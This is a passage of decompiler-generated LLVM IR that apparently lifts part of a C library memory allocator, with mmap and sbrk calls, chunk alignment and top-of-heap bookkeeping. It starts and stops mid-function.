  %v2_138a4 = icmp eq i32 %v1_138a4, 0
  %v1_138a8 = add i32 %v4_1385c, 860
  %v2_138a8 = inttoptr i32 %v1_138a8 to i32*
  %v3_138a8 = load i32, i32* %v2_138a8, align 4
  store i32 %v3_138a8, i32* %r1.global-to-local, align 4
  br i1 %v2_138a4, label %dec_label_pc_138c0, label %dec_label_pc_138b0

dec_label_pc_138b0:                               ; preds = %dec_label_pc_138a0
  %v0_138b0 = call i32 @__malloc_consolidate()
  %v0_138b4 = load i32, i32* @sl, align 4
  %v1_138b4 = add i32 %v0_138b4, -7
  store i32 %v1_138b4, i32* @r0, align 4
  %v0_138b8 = call i32 @malloc()
  store i32 %v0_138b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ca4

dec_label_pc_138c0:                               ; preds = %dec_label_pc_138a0
  %v1_138c0 = add i32 %v4_1385c, 844
  %v2_138c0 = inttoptr i32 %v1_138c0 to i32*
  %v3_138c0 = load i32, i32* %v2_138c0, align 4
  store i32 %v3_138c0, i32* %r3.global-to-local, align 4
  %v3_138c4 = icmp ult i32 %v0_13868, %v3_138c0
  %v1_138c8 = add i32 %v3_138a8, -1
  store i32 %v1_138c8, i32* %sb.global-to-local, align 4
  br i1 %v3_138c4, label %dec_label_pc_1399c, label %dec_label_pc_138d0

dec_label_pc_138d0:                               ; preds = %dec_label_pc_138c0
  %v1_138d0 = add i32 %v4_1385c, 852
  %v2_138d0 = inttoptr i32 %v1_138d0 to i32*
  %v3_138d0 = load i32, i32* %v2_138d0, align 4
  store i32 %v3_138d0, i32* %r2.global-to-local, align 4
  %v1_138d4 = add i32 %v4_1385c, 848
  %v2_138d4 = inttoptr i32 %v1_138d4 to i32*
  %v3_138d4 = load i32, i32* %v2_138d4, align 4
  store i32 %v3_138d4, i32* %r3.global-to-local, align 4
  %v6_138dc = icmp slt i32 %v3_138d4, %v3_138d0
  br i1 %v6_138dc, label %dec_label_pc_138e0, label %dec_label_pc_1399c

dec_label_pc_138e0:                               ; preds = %dec_label_pc_138d0
  %v1_138e0 = add i32 %v0_13868, 10
  %v2_138e4 = add i32 %v1_138e0, %v3_138a8
  store i32 %v2_138e4, i32* %r3.global-to-local, align 4
  %v2_138e8 = sub i32 0, %v3_138a8
  %v3_138e8 = and i32 %v2_138e4, %v2_138e8
  store i32 %v3_138e8, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_138e8, %v0_13868
  br i1 %tmp214, label %dec_label_pc_138f4, label %dec_label_pc_1399c

dec_label_pc_138f4:                               ; preds = %dec_label_pc_138e0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_138e8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1390c = call i32 @mmap(i32 0, i32 %v3_138e8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1390c, i32* %r0.global-to-local, align 4
  %v7_13910 = icmp eq i32 %v6_1390c, -1
  br i1 %v7_13910, label %dec_label_pc_138f4.dec_label_pc_1399c_crit_edge, label %dec_label_pc_13918

dec_label_pc_138f4.dec_label_pc_1399c_crit_edge:  ; preds = %dec_label_pc_138f4
  %v1_139c0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1399c

dec_label_pc_13918:                               ; preds = %dec_label_pc_138f4
  %v1_13918 = urem i32 %v6_1390c, 8
  store i32 %v1_13918, i32* %r2.global-to-local, align 4
  %v2_13918 = icmp eq i32 %v1_13918, 0
  br i1 %v2_13918, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_13918
  %v2_1391c = sub nsw i32 8, %v1_13918
  store i32 %v2_1391c, i32* %r3.global-to-local, align 4
  %v2_13920 = load i32, i32* @r4, align 4
  %v3_13920 = sub i32 %v2_13920, %v2_1391c
  %v3_13924 = add i32 %v2_1391c, %v6_1390c
  store i32 %v3_13924, i32* %lr.global-to-local, align 4
  %v2_1392c = or i32 %v3_13920, 2
  store i32 %v2_1392c, i32* %r2.global-to-local, align 4
  %v5_13934 = inttoptr i32 %v3_13924 to i32*
  store i32 %v2_1391c, i32* %v5_13934, align 4
  %v1_13938 = load i32, i32* %r2.global-to-local, align 4
  %v2_13938 = load i32, i32* %lr.global-to-local, align 4
  %v3_13938 = add i32 %v2_13938, 4
  %v4_13938 = inttoptr i32 %v3_13938 to i32*
  store i32 %v1_13938, i32* %v4_13938, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_13918
  store i32 %v6_1390c, i32* %lr.global-to-local, align 4
  %v1_1393050 = load i32, i32* @r4, align 4
  %v2_1393051 = or i32 %v1_1393050, 2
  store i32 %v2_1393051, i32* %r3.global-to-local, align 4
  %v3_1393c = inttoptr i32 %v6_1390c to i32*
  store i32 0, i32* %v3_1393c, align 4
  %v1_13940 = load i32, i32* %r3.global-to-local, align 4
  %v2_13940 = load i32, i32* %lr.global-to-local, align 4
  %v3_13940 = add i32 %v2_13940, 4
  %v4_13940 = inttoptr i32 %v3_13940 to i32*
  store i32 %v1_13940, i32* %v4_13940, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1394c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_1394c, i32* %ip.global-to-local, align 4
  %v1_13950 = add i32 %v4_1394c, 848
  %v2_13950 = inttoptr i32 %v1_13950 to i32*
  %v3_13950 = load i32, i32* %v2_13950, align 4
  store i32 %v3_13950, i32* %r3.global-to-local, align 4
  %v1_13954 = add i32 %v4_1394c, 856
  %v2_13954 = inttoptr i32 %v1_13954 to i32*
  %v3_13954 = load i32, i32* %v2_13954, align 4
  store i32 %v3_13954, i32* %r2.global-to-local, align 4
  %v1_13958 = add i32 %v3_13950, 1
  store i32 %v1_13958, i32* %r3.global-to-local, align 4
  %v7_13960 = icmp sgt i32 %v1_13958, %v3_13954
  br i1 %v7_13960, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_13958, i32* %v2_13954, align 4
  %v0_13964.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13964.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_13964 = phi i32 [ %v4_1394c, %.thread30 ], [ %v1_13964.pre, %bb150 ]
  %v0_13964 = phi i32 [ %v1_13958, %.thread30 ], [ %v0_13964.pre, %bb150 ]
  %v2_13964 = add i32 %v1_13964, 848
  %v3_13964 = inttoptr i32 %v2_13964 to i32*
  store i32 %v0_13964, i32* %v3_13964, align 4
  %v0_13968 = load i32, i32* %ip.global-to-local, align 4
  %v1_13968 = add i32 %v0_13968, 868
  %v2_13968 = inttoptr i32 %v1_13968 to i32*
  %v3_13968 = load i32, i32* %v2_13968, align 4
  store i32 %v3_13968, i32* %r3.global-to-local, align 4
  %v1_1396c = add i32 %v0_13968, 880
  %v2_1396c = inttoptr i32 %v1_1396c to i32*
  %v3_1396c = load i32, i32* %v2_1396c, align 4
  store i32 %v3_1396c, i32* %r2.global-to-local, align 4
  %v0_13970 = load i32, i32* @r4, align 4
  %v2_13970 = add i32 %v0_13970, %v3_13968
  store i32 %v2_13970, i32* %r1.global-to-local, align 4
  %v1_13974 = add i32 %v0_13968, 872
  %v2_13974 = inttoptr i32 %v1_13974 to i32*
  %v3_13974 = load i32, i32* %v2_13974, align 4
  store i32 %v3_13974, i32* %r3.global-to-local, align 4
  %v1_1397c = add i32 %v0_13968, 884
  %v2_1397c = inttoptr i32 %v1_1397c to i32*
  %v3_1397c = load i32, i32* %v2_1397c, align 4
  store i32 %v3_1397c, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_13970, %v3_1396c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_13970, i32* %v2_1396c, align 4
  %v0_13984.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13984.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_13984 = phi i32 [ %v0_13968, %bb151 ], [ %v1_13984.pre, %bb152 ]
  %v0_13984 = phi i32 [ %v2_13970, %bb151 ], [ %v0_13984.pre, %bb152 ]
  %v2_13984 = add i32 %v1_13984, 868
  %v3_13984 = inttoptr i32 %v2_13984 to i32*
  store i32 %v0_13984, i32* %v3_13984, align 4
  %v0_13988 = load i32, i32* %r1.global-to-local, align 4
  %v1_13988 = load i32, i32* %r3.global-to-local, align 4
  %v2_13988 = add i32 %v1_13988, %v0_13988
  store i32 %v2_13988, i32* %r1.global-to-local, align 4
  %v1_1398c = load i32, i32* %r2.global-to-local, align 4
  %v0_13990 = load i32, i32* %lr.global-to-local, align 4
  %v1_13990 = add i32 %v0_13990, 8
  store i32 %v1_13990, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_13988, %v1_1398c
  br i1 %tmp216, label %bb154, label %dec_label_pc_13ca4

bb154:                                            ; preds = %bb153
  %v5_13994 = load i32, i32* %ip.global-to-local, align 4
  %v6_13994 = add i32 %v5_13994, 884
  %v7_13994 = inttoptr i32 %v6_13994 to i32*
  store i32 %v2_13988, i32* %v7_13994, align 4
  br label %dec_label_pc_13ca4

dec_label_pc_1399c:                               ; preds = %dec_label_pc_138e0, %dec_label_pc_138c0, %dec_label_pc_138f4.dec_label_pc_1399c_crit_edge, %dec_label_pc_138d0
  %v1_139c0 = phi i32 [ %v1_139c0.pre, %dec_label_pc_138f4.dec_label_pc_1399c_crit_edge ], [ %v0_13868, %dec_label_pc_138d0 ], [ %v0_13868, %dec_label_pc_138c0 ], [ %v0_13868, %dec_label_pc_138e0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %ip.global-to-local, align 4
  %v4_139a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_139a4, i32* %r3.global-to-local, align 4
  %v1_139a8 = add i32 %v4_139a4, 44
  %v2_139a8 = inttoptr i32 %v1_139a8 to i32*
  %v3_139a8 = load i32, i32* %v2_139a8, align 4
  store i32 %v3_139a8, i32* %r0.global-to-local, align 4
  %v1_139ac = add i32 %v4_139a4, 864
  %v2_139ac = inttoptr i32 %v1_139ac to i32*
  %v3_139ac = load i32, i32* %v2_139ac, align 4
  store i32 %v3_139ac, i32* %r2.global-to-local, align 4
  %v1_139b0 = add i32 %v4_139a4, 840
  %v2_139b0 = inttoptr i32 %v1_139b0 to i32*
  %v3_139b0 = load i32, i32* %v2_139b0, align 4
  store i32 %v3_139b0, i32* %r3.global-to-local, align 4
  %v1_139b4 = add i32 %v3_139a8, 4
  %v2_139b4 = inttoptr i32 %v1_139b4 to i32*
  %v3_139b4 = load i32, i32* %v2_139b4, align 4
  store i32 %v3_139b4, i32* %r1.global-to-local, align 4
  %v1_139bc = urem i32 %v3_139ac, 2
  %v2_139bc = icmp eq i32 %v1_139bc, 0
  %v1_139b8 = add i32 %v1_139c0, 16
  %v2_139c0 = add i32 %v1_139b8, %v3_139b0
  store i32 %v2_139c0, i32* %r3.global-to-local, align 4
  %v1_139c4 = and i32 %v3_139b4, -4
  store i32 %v1_139c4, i32* @r8, align 4
  br i1 %v2_139bc, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_1399c
  %v3_139c8 = sub i32 %v2_139c0, %v1_139c4
  store i32 %v3_139c8, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_1399c, %bb155
  %v0_139cc = phi i32 [ %v2_139c0, %dec_label_pc_1399c ], [ %v3_139c8, %bb155 ]
  %v1_139cc = load i32, i32* %sb.global-to-local, align 4
  %v2_139cc = add i32 %v1_139cc, %v0_139cc
  store i32 %v2_139cc, i32* %r3.global-to-local, align 4
  %v1_139d0 = sub i32 -1, %v1_139cc
  store i32 %v1_139d0, i32* %fp.global-to-local, align 4
  %v2_139d4 = and i32 %v2_139cc, %v1_139d0
  store i32 %v2_139d4, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_139d4, 1
  br i1 %tmp157, label %dec_label_pc_139f8, label %dec_label_pc_139e4

dec_label_pc_139e4:                               ; preds = %bb156
  store i32 %v2_139d4, i32* %r0.global-to-local, align 4
  %v1_139e8 = call i32 @__GI_sbrk(i32 %v2_139d4)
  store i32 %v1_139e8, i32* %r0.global-to-local, align 4
  %v3_139ec = icmp eq i32 %v1_139e8, -1
  store i32 %v1_139e8, i32* @r4, align 4
  br i1 %v3_139ec, label %dec_label_pc_139f8, label %dec_label_pc_13a64

dec_label_pc_139f8:                               ; preds = %dec_label_pc_139e4, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r1.global-to-local, align 4
  %v4_13a00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13a00, i32* %r6.global-to-local, align 4
  %v1_13a04 = add i32 %v4_13a00, 864
  %v2_13a04 = inttoptr i32 %v1_13a04 to i32*
  %v3_13a04 = load i32, i32* %v2_13a04, align 4
  store i32 %v3_13a04, i32* %r3.global-to-local, align 4
  %v1_13a08 = urem i32 %v3_13a04, 2
  %v2_13a08 = icmp eq i32 %v1_13a08, 0
  br i1 %v2_13a08, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_139f8
  %v1_13a0c = load i32, i32* @r8, align 4
  %v2_13a0c = load i32, i32* %sb.global-to-local, align 4
  %v3_13a0c = add i32 %v2_13a0c, %v1_13a0c
  %v2_13a10 = load i32, i32* @r5, align 4
  %v3_13a10 = add i32 %v3_13a0c, %v2_13a10
  store i32 %v3_13a10, i32* %r3.global-to-local, align 4
  %v2_13a14 = load i32, i32* %fp.global-to-local, align 4
  %v3_13a14 = and i32 %v2_13a14, %v3_13a10
  store i32 %v3_13a14, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_139f8
  %v0_13a18.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_13a18 = phi i32 [ %v0_13a18.pr, %.thread32thread-pre-split ], [ %v3_13a14, %bb158 ]
  %v2_13a18 = icmp ugt i32 %v0_13a18, 1048575
  br i1 %v2_13a18, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_13a30 = phi i32 [ %v0_13a18, %.thread32 ], [ 1048576, %bb159 ]
  %v1_13a20 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_13a30, %v1_13a20
  br i1 %tmp217, label %dec_label_pc_13a28, label %dec_label_pc_13c8c

dec_label_pc_13a28:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_13a30, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_13a44 = call i32 @mmap(i32 0, i32 %v0_13a30, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_13a44, i32* %r0.global-to-local, align 4
  %v3_13a48 = icmp eq i32 %v6_13a44, -1
  %v8_13a48 = icmp eq i32 %v6_13a44, -1
  store i32 %v6_13a44, i32* @r4, align 4
  br i1 %v8_13a48, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_13a28
  %v1_13a50 = load i32, i32* %r6.global-to-local, align 4
  %v2_13a50 = add i32 %v1_13a50, 864
  %v3_13a50 = inttoptr i32 %v2_13a50 to i32*
  %v4_13a50 = load i32, i32* %v3_13a50, align 4
  %v2_13a54 = load i32, i32* @r5, align 4
  %v3_13a54 = add i32 %v2_13a54, %v6_13a44
  store i32 %v3_13a54, i32* %r0.global-to-local, align 4
  %v2_13a58 = and i32 %v4_13a50, -2
  store i32 %v2_13a58, i32* %r3.global-to-local, align 4
  store i32 %v2_13a58, i32* %v3_13a50, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_13a28, %bb161
  br i1 %v3_13a48, label %dec_label_pc_13a64, label %dec_label_pc_13a68

dec_label_pc_13a64:                               ; preds = %.thread35, %dec_label_pc_139e4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a68

dec_label_pc_13a68:                               ; preds = %.thread35, %dec_label_pc_13a64
  %v0_13a68 = load i32, i32* @r4, align 4
  %v7_13a68 = icmp eq i32 %v0_13a68, -1
  br i1 %v7_13a68, label %dec_label_pc_13c8c, label %dec_label_pc_13a70

dec_label_pc_13a70:                               ; preds = %dec_label_pc_13a68
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r2.global-to-local, align 4
  %v4_13a78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13a78, i32* %ip.global-to-local, align 4
  store i32 %v3_139a8, i32* %r2.global-to-local, align 4
  %v1_13a80 = add i32 %v4_13a78, 872
  %v2_13a80 = inttoptr i32 %v1_13a80 to i32*
  %v3_13a80 = load i32, i32* %v2_13a80, align 4
  %v1_13a84 = load i32, i32* @r8, align 4
  %v2_13a84 = add i32 %v1_13a84, %v3_139a8
  store i32 %v2_13a84, i32* %r1.global-to-local, align 4
  %v0_13a88 = load i32, i32* @r5, align 4
  %v2_13a88 = add i32 %v0_13a88, %v3_13a80
  store i32 %v2_13a88, i32* %r3.global-to-local, align 4
  %v9_13a8c = icmp eq i32 %v0_13a68, %v2_13a84
  br i1 %v9_13a8c, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_13a70
  store i32 %v2_13a88, i32* %v2_13a80, align 4
  br label %dec_label_pc_13aa8

bb162:                                            ; preds = %dec_label_pc_13a70
  %v1_13a90 = load i32, i32* %r0.global-to-local, align 4
  %v8_13a90 = icmp eq i32 %v1_13a90, -1
  store i32 %v2_13a88, i32* %v2_13a80, align 4
  br i1 %v8_13a90, label %.thread37, label %dec_label_pc_13aa8

.thread37:                                        ; preds = %bb162
  %v1_13a98 = load i32, i32* @r5, align 4
  %v2_13a98 = load i32, i32* @r8, align 4
  %v3_13a98 = add i32 %v2_13a98, %v1_13a98
  %v2_13a9c = or i32 %v3_13a98, 1
  store i32 %v2_13a9c, i32* %r3.global-to-local, align 4
  %v2_13aa0 = load i32, i32* %r2.global-to-local, align 4
  %v3_13aa0 = add i32 %v2_13aa0, 4
  %v4_13aa0 = inttoptr i32 %v3_13aa0 to i32*
  store i32 %v2_13a9c, i32* %v4_13aa0, align 4
  br label %dec_label_pc_13c20

dec_label_pc_13aa8:                               ; preds = %bb162, %.thread125
  %v0_13aac.pr = load i32, i32* @r8, align 4
  %v0_13aa8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13aa8 = add i32 %v0_13aa8, 864
  %v2_13aa8 = inttoptr i32 %v1_13aa8 to i32*
  %v3_13aa8 = load i32, i32* %v2_13aa8, align 4
  store i32 %v3_13aa8, i32* %r2.global-to-local, align 4
  %v2_13aac = icmp eq i32 %v0_13aac.pr, 0
  br i1 %v2_13aac, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_13aa8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_13aa8
  %v2_13ab4 = urem i32 %v3_13aa8, 2
  store i32 %v2_13ab4, i32* %r3.global-to-local, align 4
  %v2_13ab8 = icmp eq i32 %v2_13ab4, 0
  br i1 %v2_13ab8, label %.thread43, label %dec_label_pc_13ac0

dec_label_pc_13ac0:                               ; preds = %.thread39
  %v0_13ac0 = load i32, i32* @r4, align 4
  %v1_13ac0 = load i32, i32* %r1.global-to-local, align 4
  %v3_13ac0 = icmp ult i32 %v0_13ac0, %v1_13ac0
  br i1 %v3_13ac0, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_13ac0
  %v2_13ac4 = and i32 %v3_13aa8, -2
  store i32 %v2_13ac4, i32* %r3.global-to-local, align 4
  store i32 %v2_13ac4, i32* %v2_13aa8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_13ac0, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %ip.global-to-local, align 4
  %v4_13ad4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13ad4, i32* @r7, align 4
  %v1_13ad8 = add i32 %v4_13ad4, 864
  %v2_13ad8 = inttoptr i32 %v1_13ad8 to i32*
  %v3_13ad8 = load i32, i32* %v2_13ad8, align 4
  store i32 %v3_13ad8, i32* %r3.global-to-local, align 4
  %v1_13adc = urem i32 %v3_13ad8, 2
  store i32 %v1_13adc, i32* @r6, align 4
  %v2_13adc = icmp eq i32 %v1_13adc, 0
  br i1 %v2_13adc, label %dec_label_pc_13b70, label %dec_label_pc_13ae4

dec_label_pc_13ae4:                               ; preds = %.thread43
  %v0_13ae4 = load i32, i32* @r8, align 4
  %v2_13ae4 = icmp eq i32 %v0_13ae4, 0
  br i1 %v2_13ae4, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_13ae4
  %v2_13ae8 = add i32 %v4_13ad4, 872
  %v3_13ae8 = inttoptr i32 %v2_13ae8 to i32*
  %v4_13ae8 = load i32, i32* %v3_13ae8, align 4
  store i32 %v4_13ae8, i32* %r2.global-to-local, align 4
  %v1_13aec = load i32, i32* %r1.global-to-local, align 4
  %v2_13aec = load i32, i32* @r4, align 4
  %v3_13aec = sub i32 %v2_13aec, %v1_13aec
  %v3_13af0 = add i32 %v3_13aec, %v4_13ae8
  store i32 %v3_13af0, i32* %r3.global-to-local, align 4
  store i32 %v3_13af0, i32* %v3_13ae8, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_13ae4, %bb164
  %v0_13af8 = load i32, i32* @r4, align 4
  %v1_13af8 = urem i32 %v0_13af8, 8
  store i32 %v1_13af8, i32* %r3.global-to-local, align 4
  %v2_13af8 = icmp eq i32 %v1_13af8, 0
  br i1 %v2_13af8, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_13afc = sub nsw i32 8, %v1_13af8
  store i32 %v2_13afc, i32* %r3.global-to-local, align 4
  %v3_13b00 = add i32 %v2_13afc, %v0_13af8
  store i32 %v3_13b00, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_13b08 = phi i32 [ 0, %.thread46 ], [ %v2_13afc, %bb165 ]
  %v1_13b04 = load i32, i32* @r5, align 4
  %v2_13b04 = add i32 %v1_13b04, %v0_13af8
  store i32 %v2_13b04, i32* @r6, align 4
  %v1_13b08 = load i32, i32* @r8, align 4
  %v2_13b08 = add i32 %v2_13b04, %v0_13b08
  %v2_13b0c = add i32 %v2_13b08, %v1_13b08
  store i32 %v2_13b0c, i32* %r1.global-to-local, align 4
  %v1_13b10 = load i32, i32* %sb.global-to-local, align 4
  %v2_13b10 = add i32 %v1_13b10, %v2_13b0c
  %v1_13b14 = load i32, i32* %fp.global-to-local, align 4
  %v2_13b14 = and i32 %v1_13b14, %v2_13b10
  store i32 %v2_13b14, i32* %r2.global-to-local, align 4
  %v2_13b18 = sub i32 0, %v2_13b04
  store i32 %v2_13b18, i32* %r3.global-to-local, align 4
  %v2_13b1c = sub i32 %v2_13b14, %v2_13b04
  store i32 %v2_13b1c, i32* @r5, align 4
  store i32 %v2_13b1c, i32* %r0.global-to-local, align 4
  br i1 %v2_13af8, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_13af8, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_13b28 = call i32 @__GI_sbrk(i32 %v2_13b1c)
  store i32 %v1_13b28, i32* %r0.global-to-local, align 4
  %v3_13b2c = icmp eq i32 %v1_13b28, -1
  br i1 %v3_13b2c, label %dec_label_pc_13b34, label %dec_label_pc_13b44

dec_label_pc_13b34:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13b38 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13b38, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13b9c

dec_label_pc_13b44:                               ; preds = %bb167
  %v1_13b44 = load i32, i32* @r4, align 4
  %v3_13b44 = icmp ult i32 %v1_13b28, %v1_13b44
  br i1 %v3_13b44, label %dec_label_pc_13b4c, label %dec_label_pc_13b9c

dec_label_pc_13b4c:                               ; preds = %dec_label_pc_13b44
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r0.global-to-local, align 4
  %v4_13b54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13b54, i32* %r2.global-to-local, align 4
  %v1_13b58 = add i32 %v4_13b54, 864
  %v2_13b58 = inttoptr i32 %v1_13b58 to i32*
  %v3_13b58 = load i32, i32* %v2_13b58, align 4
  %v0_13b5c = load i32, i32* @r6, align 4
  store i32 %v0_13b5c, i32* %r0.global-to-local, align 4
  %v1_13b60 = and i32 %v3_13b58, -2
  store i32 %v1_13b60, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_13b60, i32* %v2_13b58, align 4
  br label %dec_label_pc_13b9c

dec_label_pc_13b70:                               ; preds = %.thread43
  %v0_13b70 = load i32, i32* %r0.global-to-local, align 4
  %v3_13b70 = icmp eq i32 %v0_13b70, -1
  br i1 %v3_13b70, label %dec_label_pc_13b78, label %dec_label_pc_13b94

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b70
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13b7c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_13b7c, i32* %r0.global-to-local, align 4
  %v0_13b80 = load i32, i32* @r7, align 4
  %v1_13b80 = add i32 %v0_13b80, 872
  %v2_13b80 = inttoptr i32 %v1_13b80 to i32*
  %v3_13b80 = load i32, i32* %v2_13b80, align 4
  store i32 %v3_13b80, i32* %r2.global-to-local, align 4
  %v0_13b84 = load i32, i32* @r4, align 4
  %v0_13b88 = load i32, i32* @r5, align 4
  %v2_13b84 = add i32 %v3_13b80, %v1_13b7c
  %v2_13b88 = sub i32 %v2_13b84, %v0_13b84
  %v2_13b8c = sub i32 %v2_13b88, %v0_13b88
  store i32 %v2_13b8c, i32* %r3.global-to-local, align 4
  store i32 %v2_13b8c, i32* %v2_13b80, align 4
  %v0_13b98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13b94

dec_label_pc_13b94:                               ; preds = %dec_label_pc_13b70, %dec_label_pc_13b78
  %v0_13b98 = phi i32 [ 0, %dec_label_pc_13b70 ], [ %v0_13b98.pre, %dec_label_pc_13b78 ]
  %v0_13b94 = load i32, i32* @r4, align 4
  store i32 %v0_13b94, i32* @r7, align 4
  store i32 %v0_13b98, i32* @r5, align 4
  br label %dec_label_pc_13b9c

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b44, %dec_label_pc_13b4c, %dec_label_pc_13b34, %dec_label_pc_13b94
  %v0_13b9c = load i32, i32* %r0.global-to-local, align 4
  %v7_13b9c = icmp eq i32 %v0_13b9c, -1
  br i1 %v7_13b9c, label %dec_label_pc_13c20, label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b9c
  %v1_13ba4 = load i32, i32* @r5, align 4
  %v2_13ba4 = add i32 %v1_13ba4, %v0_13b9c
  %v0_13ba8 = load i32, i32* @r7, align 4
  %v2_13ba8 = sub i32 %v2_13ba4, %v0_13ba8
  %v1_13bac = or i32 %v2_13ba8, 1
  %v2_13bb0 = add i32 %v0_13ba8, 4
  %v3_13bb0 = inttoptr i32 %v2_13bb0 to i32*
  store i32 %v1_13bac, i32* %v3_13bb0, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13bbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_13bbc, i32* @r6, align 4
  %v1_13bc0 = add i32 %v4_13bbc, 872
  %v2_13bc0 = inttoptr i32 %v1_13bc0 to i32*
  %v3_13bc0 = load i32, i32* %v2_13bc0, align 4
  %v0_13bc4 = load i32, i32* @r8, align 4
  %v2_13bc4 = icmp eq i32 %v0_13bc4, 0
  %v0_13bc8 = load i32, i32* @r5, align 4
  %v2_13bc8 = add i32 %v0_13bc8, %v3_13bc0
  store i32 %v2_13bc8, i32* %r3.global-to-local, align 4
  store i32 %v2_13bc8, i32* %v2_13bc0, align 4
  %v0_13bd0 = load i32, i32* @r7, align 4
  %v1_13bd0 = load i32, i32* @r6, align 4
  %v2_13bd0 = add i32 %v1_13bd0, 44
  %v3_13bd0 = inttoptr i32 %v2_13bd0 to i32*
  store i32 %v0_13bd0, i32* %v3_13bd0, align 4
  br i1 %v2_13bc4, label %dec_label_pc_13c20, label %dec_label_pc_13bd8

